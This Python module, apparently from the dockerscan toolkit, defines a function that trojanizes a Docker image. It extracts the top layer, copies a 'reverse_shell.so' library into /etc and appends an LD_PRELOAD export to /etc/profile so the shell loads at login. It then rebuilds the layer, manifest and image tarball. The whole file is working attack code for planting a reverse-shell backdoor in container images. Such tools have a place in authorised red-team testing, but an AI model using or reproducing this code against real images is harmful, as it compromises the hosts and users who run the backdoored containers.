import os.path
import logging

from .model import *
from ..docker_api import *

log = logging.getLogger("dockerscan")


def run_image_modify_trojanize_dockerscan(
        config: DockerImageInfoModifyTrojanizeModel):

    assert isinstance(config, DockerImageInfoModifyTrojanizeModel)

    output_docker_image = config.output_image
    image_path = config.image_path

    if not output_docker_image:
        output_docker_image = os.path.basename(config.image_path)
    if not output_docker_image.endswith("tar"):
        output_docker_image += ".tar"

    # 1 - Get layers info
    log.debug(" > Opening docker file")
    with open_docker_image(image_path,
                           config.image_repository) as (
            img, top_layer, _, manifest):

        # 2 - Get the last layer in manifest
        old_layer_digest = get_last_image_layer(manifest)
        log.debug(" > Last layer: {}".format(old_layer_digest))

        with extract_layer_in_tmp_dir(img, old_layer_digest) as d:

            # 3 - Trojanize
            log.info(" > Starting trojaning process")

            # 4 - Copy the shell
            log.info(" > Coping the shell: 'reverse_shell.so' "
                     "to '/etc/profile'")

            shell_path = os.path.join(os.path.dirname(__file__),
                                      "shells",
                                      "reverse_shell.so")
            copy_file_to_image_folder(d,
                                      shell_path,
                                      "/etc/reverse_shell.so")

            # 5 - Add LD_PRELOAD to /etc/profile
            log.info(" > Add LD_PRELOAD to /etc/profile")
            with open(get_file_path_from_img(d,
                                             "/etc/profile"), "a") as p:
                p.write("export LD_PRELOAD={}\n". \
                        format("/etc/reverse_shell.so"))

            new_layer_path, new_layer_digest = \
                build_image_layer_from_dir("new_layer.tar", d)

            # 6 - Updating the manifest
            new_manifest = build_manifest_with_new_layer(manifest,
                                                         old_layer_digest,
                                                         new_layer_digest)

            # 7 - Create new docker image
            log.info(" > Creating new docker image")
            create_new_docker_image(new_manifest,
                                    output_docker_image,
                                    img,
                                    old_layer_digest,
                                    new_layer_path,
                                    new_layer_digest)

__all__ = ("run_image_modify_trojanize_dockerscan",)
